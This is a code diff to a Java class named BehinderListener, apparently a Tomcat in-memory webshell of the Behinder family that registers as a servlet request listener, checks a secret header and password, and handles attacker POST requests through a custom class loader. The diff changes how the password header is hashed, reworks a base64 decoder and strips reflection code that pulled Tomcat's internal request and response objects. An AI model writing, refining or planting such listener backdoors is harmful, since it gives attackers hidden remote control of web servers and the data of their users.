@@ -40,7 +40,7 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
         try {
             MessageDigest m = MessageDigest.getInstance("MD5");
             m.update(s.getBytes(), 0, s.length());
-            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
+            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
         } catch (Exception var3) {
         }
 
@@ -49,7 +49,7 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
 
     public boolean equals(Object obj) {
         this.parseObj(obj);
-        this.Pwd = this.request.getHeader("p");
+        this.Pwd = md5(this.request.getHeader("p"));
         this.randomHeader = this.request.getHeader("h");
         StringBuffer output = new StringBuffer();
         String tag_s = "->|";
@@ -121,22 +121,15 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
         return "Success";
     }
 
-    public static byte[] base64Decode(String bs) throws Exception {
-        Class base64;
-        byte[] value = null;
+    public byte[] base64Decode(String str) throws Exception {
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-            } catch (Exception e2) {
-            }
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
+        } catch (Exception var5) {
+            Class clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
+            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
         }
-        return value;
     }
 
     @Override
@@ -151,23 +144,8 @@ public class BehinderListener extends ClassLoader implements ServletRequestListe
     @Override
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         try {
-            // 获取request、response
-            Field requestFacadeField = ServletRequestEvent.class.getDeclaredField("request");
-            requestFacadeField.setAccessible(true);
-            org.apache.catalina.connector.RequestFacade requestFacade = (RequestFacade) requestFacadeField.get(servletRequestEvent);
-
-            Field connectorRequestField = RequestFacade.class.getDeclaredField("request");
-            connectorRequestField.setAccessible(true);
-            org.apache.catalina.connector.Request req = (Request) connectorRequestField.get(requestFacade);
-
-            Field connectorResponseField = Request.class.getDeclaredField("response");
-            connectorResponseField.setAccessible(true);
-            org.apache.catalina.connector.Response resp = (Response) connectorResponseField.get(req);
-
-            HttpServletRequest request = req;
-            HttpServletResponse response = resp;
             // 入口
-            if (req.getHeader(randomHeader).equals(randomHeader) && req.getMethod().equals("POST")) {
+            if (request.getHeader(randomHeader).equals(randomHeader) && request.getMethod().equals("POST")) {
                 Object lastRequest = request;
                 Object lastResponse = response;
 
